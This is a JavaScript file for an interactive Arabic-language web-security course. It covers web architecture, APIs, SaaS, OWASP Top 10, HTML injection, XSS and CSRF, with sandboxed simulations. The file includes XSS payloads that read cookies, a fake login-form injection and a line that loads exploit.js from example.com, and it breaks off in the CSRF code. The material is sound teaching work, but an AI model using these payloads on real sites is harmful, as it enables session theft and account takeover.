
/* ===== إزاي تضيف قسم جديد؟ =====
   زوّد عنصر جديد في آخر مصفوفة CATS بالشكل ده:
   {id:'اسم-انجليزي-بدون-مسافات', g:'اسم المجموعة', t:'عنوان القسم', d:'وصف قصير',
    html:`المحتوى HTML هنا`, init(){ كود JS اختياري للتفاعل }}
   القسم هيظهر لوحده في القائمة (☰) وفي الصفحة الرئيسية. */
const $=s=>document.querySelector(s),$$=s=>[...document.querySelectorAll(s)];
function pick(sel,fn){$$(sel).forEach(b=>b.onclick=()=>{$$(sel).forEach(x=>x.classList.remove('sel'));b.classList.add('sel');fn(b)})}
const CATS=[];

/* ---------- الأساسيات ---------- */
CATS.push({id:'intro',g:'الأساسيات',t:'تطبيق الويب بيشتغل إزاي',d:'طلب واحد بيعدي على 3 طبقات. دوس وشوف.',
html:`<div class="card"><div class="flow" id="flow"></div><div class="row c"><button class="sel" id="go">ابعت طلب تسجيل دخول</button></div><ul class="log" id="log"></ul><div class="note" id="ninfo">دوس على أي طبقة عشان تعرف دورها.</div></div>
<div class="grid"><div class="card"><b>الواجهة الأمامية (Front end)</b><br>اللي بيشتغل في المتصفح: HTML للهيكل، CSS للشكل، JavaScript للتفاعل.</div><div class="card"><b>الواجهة الخلفية (Back end)</b><br>كود السيرفر وقاعدة البيانات. هنا المنطق والبيانات الحساسة.</div></div>`,
init(){const N=[['المتصفح','طبقة العرض','بيعرض HTML/CSS/JS وبيبعت طلبات HTTP للسيرفر.'],['السيرفر','طبقة التطبيق','بيستقبل الطلب وبينفذ المنطق (PHP, Node.js, Python...) وبيكلم قاعدة البيانات.'],['قاعدة البيانات','طبقة البيانات','بتخزن البيانات وبترد على الاستعلامات.']];
N.forEach((n,i)=>{if(i){const a=document.createElement('span');a.className='arrow';a.textContent='⇄';$('#flow').appendChild(a)}const b=document.createElement('button');b.className='node';b.innerHTML=n[0]+'<small>'+n[1]+'</small>';b.onclick=()=>$('#ninfo').textContent=n[0]+': '+n[2];$('#flow').appendChild(b)});
const S=[[0,'المتصفح بيبعت طلب HTTP فيه اسم المستخدم وكلمة السر.'],[1,'السيرفر بيستلم الطلب وبيفحص المدخلات.'],[2,'قاعدة البيانات بتدوّر: البيانات صحيحة؟'],[1,'السيرفر بيبني صفحة الرد.'],[0,'المتصفح بيعرض الصفحة. تم الدخول.']];let busy=0;
$('#go').onclick=()=>{if(busy)return;busy=1;$('#log').innerHTML='';const ns=$$('.node');S.forEach((s,i)=>setTimeout(()=>{ns.forEach(n=>n.classList.remove('hot'));ns[s[0]].classList.add('hot');const li=document.createElement('li');li.textContent=(i+1)+'. '+s[1];$('#log').appendChild(li);if(i===S.length-1)setTimeout(()=>{ns.forEach(n=>n.classList.remove('hot'));busy=0},700)},i*900))}}});

CATS.push({id:'siteapp',g:'الأساسيات',t:'موقع ويب ولا تطبيق ويب؟',d:'الموقع الثابت نفسه للكل، والتطبيق بيتغير حسب المستخدم.',
html:`<div class="card"><div class="row"><span>النوع:</span><button id="m0" class="sel">موقع ثابت</button><button id="m1">تطبيق ويب</button></div><div class="row" style="margin-top:8px"><span>المستخدم:</span><button id="u0" class="sel">أحمد</button><button id="u1">سارة</button></div><div class="mock" id="mock" style="margin-top:12px"></div></div>
<div class="grid"><div class="card">مفتوح المصدر: WordPress، OpenCart، Joomla.</div><div class="card">مغلق المصدر: Wix، Shopify، DotNetNuke.</div></div>`,
init(){let m=0,u=0;const U=[['أحمد','لابتوب','3 رسائل'],['سارة','كتاب','لا رسائل']];
const r=()=>{const k=$('#mock');k.classList.remove('flash');void k.offsetWidth;k.classList.add('flash');k.innerHTML=m?`<b>أهلاً ${U[u][0]}</b><br>سلتك: ${U[u][1]}<br>الإشعارات: ${U[u][2]}<br><small>صفحة ديناميكية اتبنت للمستخدم ده.</small>`:`<b>مرحباً بك في موقعنا</b><br>نفس الصفحة بالظبط لكل الزوار.<br><small>صفحة ثابتة: التعديل بيتم يدويًا في الملف.</small>`};
[['m',v=>m=v],['u',v=>u=v]].forEach(([p,f])=>[0,1].forEach(i=>$('#'+p+i).onclick=()=>{f(i);[0,1].forEach(j=>$('#'+p+j).classList.toggle('sel',j===i));r()}));r()}});

CATS.push({id:'native',g:'الأساسيات',t:'تطبيق ويب مقابل تطبيق أصلي',d:'فلتر الجدول وشوف مين الأفضل في كل نقطة.',
html:`<div class="row"><button class="sel" data-f="all">الكل</button><button data-f="w">الويب أفضل</button><button data-f="n">الأصلي أفضل</button></div><div class="card" style="overflow-x:auto"><table><thead><tr><th>النقطة</th><th>الويب</th><th>الأصلي</th></tr></thead><tbody id="cmp"></tbody></table></div><div class="note">الحل الوسط: تطبيقات الويب الهجينة والتقدمية (PWA) أسرع وأقدر، وبتشتغل أوفلاين.</div>`,
init(){const R=[['التثبيت','مش محتاج','لازم تثبيت','w'],['التحديث','مكان واحد (السيرفر) والكل بنفس النسخة','لكل مستخدم','w'],['المنصة','أي نظام عبر المتصفح','نسخة لكل نظام','w'],['المساحة','مبتاخدش من الهارد','بتاخد مساحة','w'],['السرعة','أبطأ نسبيًا','أسرع بكثير','n'],['إمكانيات الجهاز','محدودة بالمتصفح','وصول عميق للنظام','n']];
const c=f=>$('#cmp').innerHTML=R.filter(r=>f==='all'||r[3]===f).map(r=>`<tr><td>${r[0]}</td><td class="${r[3]=='w'?'w':''}">${r[1]}</td><td class="${r[3]=='n'?'n':''}">${r[2]}</td></tr>`).join('');c('all');pick('[data-f]',b=>c(b.dataset.f))}});

CATS.push({id:'web12',g:'الأساسيات',t:'الويب 1.0 و الويب 2.0',d:'الويب 2.0 وصف لتغيير: المستخدم بقى مشارك مش بس قارئ.',
html:`<div class="row"><button class="sel" data-v="0">الويب 1.0</button><button data-v="1">الويب 2.0</button></div><div class="card" id="w2"></div>
<h3>جرّب Ajax</h3><div class="card"><div class="row"><button id="rl">إعادة تحميل الصفحة</button><button id="aj" class="sel">طلب Ajax</button></div><div class="mock" id="aj-box" style="margin-top:10px">الهيدر: <b id="hd">تحميل رقم 1</b><br>الإشعارات: <b id="nt">0 رسائل</b></div><p class="lead">Ajax بيحدّث جزء واحد بس بدون إعادة تحميل الصفحة، وده اللي خلّى الصفحات تشتغل زي التطبيقات.</p></div>`,
init(){const W=[['الأساس: صفحات HTML ثابتة.','المستخدم: قارئ فقط.','أمثلة: GeoCities، دفاتر الزوار.','التعديل: يدويًا من المطوّر.'],['الأساس: تطبيقات تفاعلية وقواعد بيانات.','المستخدم: مشارك ومنتج محتوى.','أمثلة: Facebook، YouTube، Wikipedia.','التقنيات: Ajax، JSON، APIs.']];
const w=i=>$('#w2').innerHTML='<ul style="margin:0;padding-inline-start:20px">'+W[i].map(x=>'<li>'+x+'</li>').join('')+'</ul>';w(0);pick('[data-v]',b=>w(+b.dataset.v));
let l=1,n=0;$('#rl').onclick=()=>{l++;n=0;$('#hd').textContent='تحميل رقم '+l;$('#nt').textContent='0 رسائل';const b=$('#aj-box');b.classList.remove('flash');void b.offsetWidth;b.classList.add('flash')};
$('#aj').onclick=()=>{$('#nt').textContent='جاري الجلب...';setTimeout(()=>$('#nt').textContent=(++n)+' رسائل',500)}}});

/* ---------- المعمارية ---------- */
CATS.push({id:'layout',g:'المعمارية',t:'تخطيط تطبيقات الويب',d:'4 نماذج للبنية التحتية. اختار نموذج واضغط على أي جزء وافترض إنه اتخترق.',
html:`<div class="row" id="mb"></div><div class="card"><div class="flow" id="ln"></div><div class="note" id="lt"></div></div>
<div class="note">أمن المعمارية: أحيانًا الثغرة مش خطأ في الكود، بل في التصميم (مثلًا غياب RBAC). وإصلاحها بيحتاج تغيير كبير ومكلف، عشان كده الأمان لازم يتحسب من البداية.</div>
<div class="grid"><div class="card"><b>Microservices</b><br>مكونات مستقلة لكل مهمة (تسجيل، بحث، مدفوعات...)، stateless، ممكن تتكتب بلغات مختلفة. فوائدها: رشاقة، توسع مرن، نشر سهل، صمود.</div><div class="card"><b>Serverless</b><br>مزوّد السحابة (AWS, GCP, Azure) بيدير الخوادم، والتطبيق بيشتغل في حاويات stateless.</div></div>`,
init(){const M=[['عميل-خادم','الخادم يستضيف التطبيق ويوزعه على العملاء (متصفح، موبايل...). هو الأساس لمعظم التطبيقات.',['الخادم'],[],0],['خادم واحد','كل التطبيقات وقاعدة البيانات على سيرفر واحد. سهل لكنه الأخطر: "كل البيض في سلة واحدة"، واختراق تطبيق واحد أو توقف السيرفر يأثر على الكل.',['سيرفر واحد: تطبيقات + DB'],[],1],['خوادم متعددة، DB واحدة','قاعدة البيانات على خادم خاص. اختراق خادم ويب مش بيأثر مباشرة على الباقي (تجزئة)، لكن DB المشتركة لو اتخترقت بيانات الكل بتتأثر. لازم تقييد صلاحيات الوصول.',['خادم 1','خادم 2','خادم 3'],['DB مشتركة'],0],['خوادم متعددة، DBs متعددة','كل تطبيق له قاعدة بياناته. أفضل أمنيًا بفضل التجزئة والتكرارية (redundancy)، وغالبًا بيحتاج load balancers.',['خادم 1','خادم 2','خادم 3'],['DB 1','DB 2','DB 3'],0]];
let cur=0,hit=null;
function draw(){const m=M[cur],f=document.createDocumentFragment();const mk=(l,k,id)=>{const b=document.createElement('button');b.className='node'+((hit!==null&&(m[4]||hit===id))?' bad':'');b.innerHTML=l+(b.className.includes('bad')?'<small>مخترق</small>':'');b.onclick=()=>{hit=id;draw()};return b};
$('#ln').innerHTML='';const col=(arr,k)=>{const d=document.createElement('div');d.className='flow';arr.forEach((l,i)=>d.appendChild(mk(l,k,k+i)));return d};
const h=document.createElement('div');h.className='arrow';h.textContent='👤 عملاء ⇅';const w=document.createElement('div');w.style.width='100%';w.append(h,col(m[2],'s'));if(m[3].length){const a=document.createElement('div');a.className='arrow';a.style.textAlign='center';a.textContent='⇅';w.append(a,col(m[3],'d'))}$('#ln').appendChild(w);
$('#lt').textContent=m[1]+(hit!==null?(m[4]?' النتيجة: كل حاجة اتأثرت.':' النتيجة: الجزء المخترق بس هو اللي اتأثر مباشرة.'):'')}
M.forEach((m,i)=>{const b=document.createElement('button');b.textContent=m[0];if(!i)b.className='sel';b.onclick=()=>{cur=i;hit=null;$$('#mb button').forEach((x,j)=>x.classList.toggle('sel',j===i));draw()};$('#mb').appendChild(b)});draw()}});

CATS.push({id:'comps',g:'المعمارية',t:'مكونات ومعمارية ثلاثية الطبقات',d:'اضغط على أي مكون واقرأ دوره.',
html:`<div class="row" id="cp"></div><div class="note" id="ci">اختار مكون.</div>
<h3>Three Tier Architecture</h3><div class="grid"><div class="card"><b>طبقة العرض</b><br>واجهة المستخدم: HTML وJS وCSS عبر المتصفح.</div><div class="card"><b>طبقة التطبيق</b><br>بتعالج الطلبات وبتفحص التفويض والامتيازات والبيانات.</div><div class="card"><b>طبقة البيانات</b><br>بتحدد مكان تخزين البيانات وإزاي توصلها.</div></div>`,
init(){const C=[['العميل','المتصفح أو الجهاز اللي بيطلب الخدمة.'],['الخادم','الجهاز اللي بيستضيف التطبيق.'],['خادم الويب','بيتعامل مع طلبات HTTP (Apache, NGINX, IIS).'],['منطق التطبيق','الكود الأساسي اللي بينفذ الوظائف.'],['قاعدة البيانات','تخزين واسترجاع البيانات.'],['الخدمات المصغرة','مكونات مستقلة، كل واحد لمهمة.'],['تكاملات الطرف الثالث','خدمات خارجية (دفع، تحليلات...).'],['تكاملات التطبيق','ربط التطبيق بأنظمة أو APIs تانية.'],['الدوال (Serverless)','وظائف صغيرة بتشتغل على السحابة بدون إدارة خوادم.']];
C.forEach(c=>{const b=document.createElement('button');b.textContent=c[0];b.onclick=()=>{$$('#cp button').forEach(x=>x.classList.remove('sel'));b.classList.add('sel');$('#ci').textContent=c[0]+': '+c[1]};$('#cp').appendChild(b)})}});

CATS.push({id:'frontback',g:'المعمارية',t:'الواجهة الأمامية مقابل الخلفية',d:'جرّب تعدّل HTML وشوف النتيجة فورًا.',
html:`<div class="grid"><div class="card"><b>Front end</b><br>اللي بيتنفّذ عند العميل ويتفسّره المتصفح. لازم يتكيّف مع أي شاشة وجهاز. لو بطيء، المستخدم بيفتكر إن السيرفر هو البطيء. يشمل كمان تصميم UI وUX.</div><div class="card"><b>Back end</b><br>بيشغّل الوظائف الأساسية على السيرفر: المنطق، قاعدة البيانات، المكتبات، الـ APIs، ودمج الخدمات السحابية.</div></div>
<h3>جرّب بنفسك</h3><div class="card"><textarea id="ed"><p><strong>أهلاً بك</strong></p>
<p><em>نص مائل</em></p>
<p style="color:#0000ff">نص أزرق</p></textarea><iframe id="pv" sandbox title="معاينة"></iframe></div>
<h3>مكونات الخلفية الأربعة</h3><div class="card" style="overflow-x:auto"><table><tr><td>الخوادم</td><td>Linux / Windows / Containers</td></tr><tr><td>خوادم الويب</td><td>Apache، NGINX، IIS</td></tr><tr><td>قواعد البيانات</td><td>MySQL، MSSQL، Oracle، PostgreSQL، MongoDB</td></tr><tr><td>أطر التطوير</td><td>Laravel، ASP.NET، Spring، Django، Express</td></tr></table></div>
<div class="note">ممكن تفصل كل مكون في حاوية Docker أو خادم خاص لعزل الثغرات.</div>
<h3>Whitebox مقابل Blackbox</h3><div class="row"><button class="sel" data-b="0">Whitebox</button><button data-b="1">Blackbox</button></div><div class="note" id="bx"></div>`,
init(){const e=$('#ed');const u=()=>$('#pv').srcdoc=e.value;e.oninput=u;u();
const B=['وصول كامل للكود المصدري، فتعمل مراجعة كود لإيجاد الثغرات.','كود الخلفية على السيرفر ومفيش وصول ليه. لكن LFI أو التطبيقات مفتوحة المصدر ممكن تكشف الكود. لو الكود ظهر، ممكن تلاقي كلمات سر وثغرات صعبة الاكتشاف.'];
const f=i=>$('#bx').textContent=B[i];f(0);pick('[data-b]',b=>f(+b.dataset.b))}});

/* ---------- التقنيات ---------- */
CATS.push({id:'api',g:'التقنيات',t:'Web API و Web Service',d:'API هو بوابة بيتكلم بيها برنامج مع برنامج. غيّر الطلب وشوف الرد.',
html:`<div class="card"><b>مثال: API ناسا (صورة اليوم)</b><div class="url" id="au"></div><div class="row" style="margin-top:10px"><label>التاريخ: <input type="date" id="dt" value="1996-12-03"></label><label>المفتاح: <select id="ky"><option>DEMO_KEY</option><option value="">(بدون مفتاح)</option></select></label><button class="sel" id="call">ابعت (GET)</button></div><pre id="rs">اضغط "ابعت".</pre><div class="note">Endpoint هو العنوان، ؟ بتفصله عن الـ parameters، و&amp; بتفصل بين الـ parameters. الرد هنا توضيحي مبسط.</div></div>
<div class="grid"><div class="card"><b>REST</b><br>أفعال HTTP على موارد، بيانات JSON أو XML. الأشهر والأبسط.</div><div class="card"><b>SOAP</b><br>معيار W3C، XML إجباري، موصوف بـ WSDL. أثقل وأكثر صرامة.</div></div>`,
init(){const u=()=>$('#au').innerHTML='<b class="e">https://api.nasa.gov/planetary/apod</b>?<b class="k">api_key='+$('#ky').value+'</b>&amp;<b class="d">date='+$('#dt').value+'</b>';u();$('#ky').onchange=$('#dt').onchange=u;
$('#call').onclick=()=>$('#rs').textContent=JSON.stringify($('#ky').value?{date:$('#dt').value,media_type:'image',service_version:'v1',title:'(عنوان الصورة)',url:'https://apod.nasa.gov/.../photo.jpg'}:{error:{code:'API_KEY_MISSING'}},null,2)}});

CATS.push({id:'saas',g:'التقنيات',t:'البرمجيات كخدمة (SaaS)',d:'اختار نموذج وشوف مين المسؤول: إنت (أصفر) ولا المزوّد.',
html:`<div class="row" id="sb"></div><div class="card"><div class="grid" id="sg" style="grid-template-columns:1fr 1fr"></div><p class="note" id="sn"></p></div><div class="grid"><div class="card"><b>طرق الربح</b><br>اشتراك، دفع بالاستخدام، freemium.</div><div class="card"><b>Multi-tenant</b><br>نسخة واحدة تخدم كل العملاء، فالتحديث بيوصل للكل فورًا.</div><div class="card"><b>العيوب</b><br>vendor lock-in، زمن استجابة أعلى، مخاوف الخصوصية.</div></div>`,
init(){const L=['التطبيقات','البيانات','Runtime وMiddleware','نظام التشغيل','الخوادم'],M=[['On-premises',5,'كل حاجة عندك.'],['IaaS',4,'المزوّد يأجّر البنية. النظام والتطبيقات عليك.'],['PaaS',2,'المزوّد يوفر النظام والـ middleware. إنت بتحط تطبيقك وبياناتك.'],['SaaS',0,'المزوّد يدير كل حاجة وإنت بتستخدم من المتصفح.']];
const s=i=>{$$('#sb button').forEach((b,j)=>b.classList.toggle('sel',i===j));$('#sg').innerHTML=L.map((l,j)=>`<div class="cell ${j<M[i][1]?'you':'prov'}">${l}<br><small>${j<M[i][1]?'إنت':'المزوّد'}</small></div>`).join('');$('#sn').textContent=M[i][2]};
M.forEach((m,i)=>{const b=document.createElement('button');b.textContent=m[0];b.onclick=()=>s(i);$('#sb').appendChild(b)});s(3)}});

/* ---------- الأمان ---------- */
CATS.push({id:'vulns',g:'الأمان',t:'الثغرات الأساسية',d:'افتح كل ثغرة وجرّب المحاكاة.',
html:`<div class="warn">للتعلم فقط. الاختبار بيتم على أنظمة عندك إذن عليها (زي HTB وبيئات التدريب).</div>
<details open><summary>حقن SQL</summary><p>مدخلات بتوصل لقاعدة البيانات بدون تنظيف: تسرّب بيانات أو ملفات، وأحيانًا تنفيذ أوامر. <span class="ok">الحماية:</span> parameterized queries وفحص المدخلات. وحقن الأوامر (Command Injection) نفس الفكرة على نظام التشغيل.</p></details>
<details><summary>رفع الملفات غير المقيّد</summary><p>رفع صورة بروفايل بيقبل أي نوع ملف فممكن يتحمل كود ضار. <span class="ok">الحماية:</span> أنواع محددة وفحص المحتوى.</p></details>
<details><summary>IDOR</summary><p>أنت مستخدم 701. غيّر الرقم:</p><div class="url">/user/<input type="number" id="uid" value="701" style="width:90px">/edit-profile</div><div class="mock" id="id-r" style="margin-top:8px"></div><p><span class="ok">الحماية:</span> السيرفر يتأكد إنك صاحب المورد.</p></details>
<details><summary>التحكم في الوصول المعطّل</summary><p>طلب التسجيل بيبعت <code dir="ltr">roleid=3</code>. غيّره:</p><select id="rid"><option>3</option><option>2</option><option>1</option><option>0</option></select><div class="mock" id="rl-r" style="margin-top:8px"></div><p><span class="ok">الحماية:</span> السيرفر هو اللي يحدد الدور.</p></details>
<h3>سلسلة هجوم حقيقية</h3><div class="card"><div class="flow" id="ch"></div><div class="note" id="ci2">دوس على أي خطوة.</div></div>`,
init(){const i=()=>{const v=+$('#uid').value;$('#id-r').innerHTML=v===701?'<span class="ok">ده بروفايلك. عادي.</span>':`<span class="bad">فتحت بروفايل مستخدم ${v}! السيرفر ماتأكدش إنك صاحبه.</span>`};$('#uid').oninput=i;i();
const r=()=>{const v=+$('#rid').value;$('#rl-r').innerHTML=`<code dir="ltr">username=bjones&amp;roleid=${v}</code><br>`+(v===3?'<span class="ok">مستخدم عادي.</span>':'<span class="bad">اتسجّل أدمن! تصعيد صلاحيات.</span>')};$('#rid').onchange=r;r();
const C=[['حقن SQL','تسريب إيميلات مستخدمي Active Directory، وغالبًا هي نفسها أسماء المستخدمين.'],['قائمة مستخدمين','تجميع الأسماء كقائمة.'],['Password spraying','تجربة كلمة سر شائعة على كل الأسماء ضد VPN أو Outlook Web Access.'],['موطئ قدم','حساب ضعيف واحد يكفي للوصول للإيميل أو الشبكة الداخلية.']];
C.forEach((c,k)=>{if(k){const a=document.createElement('span');a.className='arrow';a.textContent='←';$('#ch').appendChild(a)}const b=document.createElement('button');b.className='node';b.textContent=c[0];b.onclick=()=>{$$('#ch .node').forEach(x=>x.classList.remove('hot'));b.classList.add('hot');$('#ci2').textContent=c[1]};$('#ch').appendChild(b)})}});

CATS.push({id:'owasp',g:'الأمان',t:'OWASP Top 10 وأخطاء المطورين',d:'اضغط على أي بند وشوف معناه ببساطة.',
html:`<div class="row" id="ow"></div><div class="note" id="oi">اختار بند.</div>
<details><summary>أشهر 20 خطأ بيعملهم مطورو الويب</summary><ol id="t20"></ol></details>`,
init(){const O=[['التحكم في الوصول المعطل','المستخدم يوصل لحاجة مش من صلاحياته (IDOR، تغيير roleid).'],['إخفاقات التشفير','بيانات حساسة بدون تشفير سليم أو بتشفير ضعيف.'],['الحقن (Injection)','مدخلات بتتنفذ كأوامر (SQL، Command).'],['التصميم غير الآمن','العيب في التصميم نفسه، وإصلاحه مكلف.'],['سوء الإعدادات الأمنية','إعدادات افتراضية أو مفتوحة أكتر من اللازم.'],['مكونات قديمة بثغرات','مكتبات وإصدارات فيها ثغرات معروفة.'],['إخفاقات المصادقة','كلمات سر ضعيفة وجلسات غير محمية.'],['سلامة البرمجيات والبيانات','تحديثات أو بيانات بدون تحقق من سلامتها.'],['إخفاقات التسجيل والمراقبة','الهجوم بيعدّي من غير ما حد يلاحظ.'],['SSRF','تخلي السيرفر يطلب روابط يحددها المهاجم.']];
O.forEach((o,k)=>{const b=document.createElement('button');b.textContent=(k+1)+'. '+o[0];b.onclick=()=>{$$('#ow button').forEach(x=>x.classList.remove('sel'));b.classList.add('sel');$('#oi').textContent=o[0]+': '+o[1]};$('#ow').appendChild(b)});
$('#t20').innerHTML='السماح ببيانات غير صالحة في قاعدة البيانات|التركيز على النظام ككل|ابتكار أساليب أمان شخصية|الأمان كخطوة أخيرة|تخزين كلمات المرور كنص عادي|كلمات مرور ضعيفة|بيانات غير مشفرة في DB|الاعتماد المفرط على جانب العميل|التفاؤل المفرط|السماح بمتغيرات في مسار URL|الثقة بكود الطرف الثالث|حسابات أبواب خلفية ثابتة في الكود|حقن SQL غير متحقق منه|تضمين الملفات عن بعد|تعامل غير آمن مع البيانات|فشل تشفير البيانات صح|عدم استخدام نظام تشفير آمن|تجاهل الطبقة 8 (المستخدم)|عدم مراجعة إجراءات المستخدم|سوء إعداد جدار حماية التطبيقات (WAF)'.split('|').map(x=>'<li>'+x+'</li>').join('')}});

CATS.push({id:'htmli',g:'الأمان',t:'حقن HTML (HTML Injection)',d:'اكتب اسمك وشوف الصفحة بتعرضه إزاي. بدّل بين الكود الضعيف والآمن.',
html:`<p>التحقق من المدخلات وتعقيمها لازم يتم في الواجهة الخلفية <b>والأمامية</b> معًا، لأن بعض المدخلات بتتعالج وتتعرض في المتصفح من غير ما توصل للسيرفر أصلًا. حقن HTML بيحصل لما مدخلات المستخدم تتعرض على الصفحة بدون ترشيح، سواء اترجعت من قاعدة البيانات (زي تعليق متخزّن) أو اتعرضت مباشرة بـ JavaScript.</p>
<div class="grid"><div class="card"><b>خداع تسجيل الدخول</b><br>حقن نموذج دخول مزيف بيبعت البيانات لسيرفر خبيث.</div><div class="card"><b>تشويه الصفحة (Defacing)</b><br>تغيير شكل الصفحة أو إدراج إعلانات خبيثة، وده بيضر سمعة الشركة.</div></div>
<h3>جرّب بنفسك</h3>
<div class="row"><button class="sel" data-h="0">كود ضعيف (innerHTML)</button><button data-h="1">كود آمن (textContent)</button></div>
<pre id="hc"></pre>
<div class="card"><div class="row"><input id="hi" value="Ahmed" style="flex:1;min-width:200px;direction:ltr"><button class="sel" id="hb">Click to enter your name</button></div>
<div class="row" style="margin-top:8px"><button data-p="0">اسم عادي</button><button data-p="1">تغيير الخلفية</button><button data-p="2">نموذج دخول مزيف</button></div>
<iframe id="hf" sandbox title="صفحة المثال" style="margin-top:10px"></iframe></div>
<div class="note">المعاينة جوه iframe معزول ومفيش سكربتات بتتنفّذ. الفرق عن XSS: حقن HTML بيغيّر المحتوى والشكل، أما XSS فبينفّذ كود JavaScript.</div>
<div class="note"><span class="ok">الحماية:</span> استخدم textContent بدل innerHTML، رمّز المخرجات، وعقّم المدخلات في الواجهتين. <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection" target="_blank" rel="noopener" style="color:var(--acc)">دليل OWASP لاختبار حقن HTML</a></div>`,
init(){let m=0;const E=v=>v.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'),
C=['output.innerHTML = "Your name is " + input;','output.textContent = "Your name is " + input;'],
PL=['Ahmed','<style>body{background:#7a1f3d;color:#fff}</style>','<h3>Session expired</h3><form><input placeholder="user"><br><input type="password" placeholder="password"><br><button>Login</button></form>'];
const run=()=>{const v=$('#hi').value;$('#hf').srcdoc='<style>body{font-family:sans-serif;background:#fff;color:#111;margin:12px}</style><p>Your name is '+(m?E(v):v)+'</p>'};
pick('[data-h]',b=>{m=+b.dataset.h;$('#hc').textContent=C[m];run()});
$$('[data-p]').forEach(b=>b.onclick=()=>{$('#hi').value=PL[+b.dataset.p];run()});
$('#hb').onclick=run;$('#hc').textContent=C[0];run()}});

CATS.push({id:'xss',g:'الأمان',t:'XSS: البرمجة النصية عبر المواقع',d:'محاكاة قسم تعليقات: بدّل بين الوضع غير الآمن والآمن.',
html:`<div class="warn">محاكاة للتعلم: مفيش كود بيتنفّذ فعلًا هنا.</div><p>حقن HTML ممكن يتطوّر لـ XSS: بدل ما نحقن HTML بس، بنحقن كود JavaScript بيتنفّذ عند الضحية، فنقدر نوصل لحسابه أو جهازه. XSS شبه حقن HTML عمليًا لكن تأثيره أكبر.</p>
<h3>3 أنواع</h3><div class="grid"><div class="card"><b>Reflected (المنعكس)</b><br>المدخل بيتعرض بعد معالجته، زي نتيجة بحث أو رسالة خطأ.</div><div class="card"><b>Stored (المخزن)</b><br>المدخل بيتخزن في قاعدة البيانات وبيتعرض لما يتسترجع، زي التعليقات والمنشورات.</div><div class="card"><b>DOM-based</b><br>المدخل بيتكتب مباشرة في DOM جوه المتصفح، زي الاسم في مثال حقن HTML.</div></div>
<details><summary>مثال حمولة DOM XSS من المرجع</summary><pre>#"&gt;&lt;img src=/ onerror=alert(document.cookie)&gt;</pre><p>الحمولة بتدخل لشجرة DOM وبتقرا قيمة الـ cookie. المتصفح بيعتبر المدخل DOM جديد فبينفّذ الـ JavaScript. المهاجم يقدر يستغل ده لسرقة جلسة الكوكيز وإرسالها لنفسه واستخدامها في المصادقة كأنه الضحية، ولهجمات تانية ضد مستخدمي التطبيق.</p></details>
<h3>جرّب المحاكاة</h3>
<div class="row"><button class="sel" data-x="0">وضع غير آمن</button><button data-x="1">وضع آمن (escape)</button></div>
<div class="card"><input id="xi" style="width:100%;direction:ltr" value="<b>تعليق عادي</b>"><div class="row" style="margin-top:8px"><button class="sel" id="xs">انشر التعليق</button><button id="xe">مدخل خبيث (script)</button><button id="xe2">حمولة DOM</button></div><div class="mock" id="xo" style="margin-top:10px">التعليقات هتظهر هنا.</div></div>
<div class="note"><span class="ok">الحماية:</span> ترميز المخرجات (output encoding)، تعقيم المدخلات، وسياسة CSP. المتصفحات الحديثة فيها حمايات مدمجة تمنع التنفيذ التلقائي للجافاسكريبت، لكنها مش ضمان كافي.</div>`,
init(){let m=0;pick('[data-x]',b=>m=+b.dataset.x);const E=v=>v.replace(/&/g,'&amp;').replace(/</g,'&lt;'),bad=/<scr|on\w+\s*=|javascript:/i;
$('#xe').onclick=()=>{$('#xi').value='<scr'+'ipt>alert(1)</scr'+'ipt>'};$('#xe2').onclick=()=>{$('#xi').value='#"><img src=/ onerror=alert(document.cookie)>'};
$('#xs').onclick=()=>{const v=$('#xi').value,o=$('#xo');o.classList.remove('flash');void o.offsetWidth;o.classList.add('flash');
if(m){o.textContent=v;return}
o.innerHTML=bad.test(v)?'<span class="bad">⚠ الكود ده كان هيتنفّذ في متصفح كل زائر!</span><pre>'+E(v)+'</pre>':v}}});

CATS.push({id:'csrf',g:'الأمان',t:'CSRF: تزوير الطلبات',d:'موقع خبيث يخلي متصفحك يبعت طلب باسمك. جرّب مع وبدون token.',
html:`<p>CSRF هو تنفيذ إجراءات باسم مستخدم مُصادَق عليه. ممكن يستغل XSS لتنفيذ استعلامات واستدعاءات API على تطبيق الضحية مسجّل دخول فيه، أو ثغرات تانية زي معلمات HTTP. والمتصفح بيبعت الكوكيز تلقائيًا، فالطلب المزوّر بيبان شرعي.</p>
<div class="grid"><div class="card"><b>سيناريو شائع</b><br>حمولة JavaScript (مثلًا في تعليق خبيث) بتغيّر كلمة مرور الضحية تلقائيًا بجلسته، وبعدها المهاجم يدخل الحساب ويتحكم فيه.</div><div class="card"><b>استهداف المسؤولين</b><br>حسابات الأدمن ليها وظائف حساسة ممكن توصل للسيطرة على الخلفية. المهاجم ممكن يحمّل ملف .js من بعيد بدل الكود المباشر:<pre>"&gt;&lt;script src=//www.example.com/exploit.js&gt;&lt;/script&gt;</pre>وده محتاج معرفة بإجراءات وAPIs تغيير الباسورد في التطبيق المستهدف.</div></div>
<h3>جرّب المحاكاة</h3>
<div class="card"><p>رصيدك في البنك: <b id="bal">1000</b>$</p><div class="row"><label><input type="checkbox" id="tk"> تفعيل CSRF token</label><button class="sel" id="ev">افتح موقع خبيث</button><button id="rz">إعادة</button></div><ul class="log" id="cl"></ul></div>
<h3>الوقاية</h3><div class="grid"><div class="card"><b>التعقيم (Sanitization)</b><br>شيل الأحرف الخاصة وغير القياسية من المدخلات قبل عرضها أو تخزينها.</div><div class="card"><b>التحقق (Validation)</b><br>اتأكد إن المدخل بالتنسيق المتوقع (مثلًا الإيميل يطابق شكل الإيميل).</div></div>
<div class="note">نظّف المخرجات المعروضة كمان، وكده حتى لو المهاجم عدّى فلاتر الواجهتين مفيش ضرر على الواجهة الأمامية. والـ WAF بيساعد في منع الحقن تلقائيًا، لكن ممكن يتتجاوز، فمتعتمدش عليه لوحده.</div>
<div class="note"><span class="ok">دفاعات CSRF:</span> token فريد لكل جلسة أو طلب، وسمة SameSite (Strict أو Lax) للكوكيز، وطلب كلمة المرور قبل تغييرها. دي طبقات حماية إضافية مش ضمانات، والأساس إن التطبيق يتصمم آمن. <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener" style="color:var(--acc)">ورقة OWASP لمنع CSRF</a></div>`,
init(){let b=1000;const L=t=>{const li=document.createElement('li');li.textContent=t;$('#cl').appendChild(li)};
